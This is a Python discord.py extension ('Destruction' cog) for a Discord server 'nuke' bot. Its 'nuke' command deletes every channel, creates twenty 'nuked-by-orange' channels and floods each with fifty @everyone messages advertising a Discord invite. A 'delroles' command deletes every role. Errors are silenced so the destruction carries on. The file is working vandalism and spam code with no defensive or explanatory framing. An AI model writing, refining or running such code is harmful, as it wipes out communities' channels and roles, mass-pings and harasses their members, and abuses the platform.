import discord
from discord.ext import commands
import asyncio

class Destruction(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        
        # --- FIXED SETTINGS ---
        self.CHANNELS = 20
        self.MESSAGES = 50
        self.CONTENT = "@everyone NUKED BY ORANGE https://discord.gg/WKeqUWFyUT 💀"
        # ----------------------

    @commands.command()
    async def nuke(self, ctx):
        """Deletes all channels and creates the set amount with spam."""
        if not ctx.guild:
            return

        try:
            await ctx.message.delete()
        except:
            pass

        # 1. Delete all existing channels
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                continue

        # 2. Create new channels and start spam tasks
        for i in range(self.CHANNELS):
            try:
                new_channel = await ctx.guild.create_text_channel(f"nuked-by-orange-{i+1}")
                self.bot.loop.create_task(self.spam_logic(new_channel))
            except:
                continue

    async def spam_logic(self, channel):
        """Spams the hardcoded message"""
        for _ in range(self.MESSAGES):
            try:
                await channel.send(self.CONTENT)
                await asyncio.sleep(0.1)
            except:
                break

    @commands.command()
    async def delroles(self, ctx):
        """Deletes all roles"""
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                continue

def setup(bot):
    bot.add_cog(Destruction(bot))
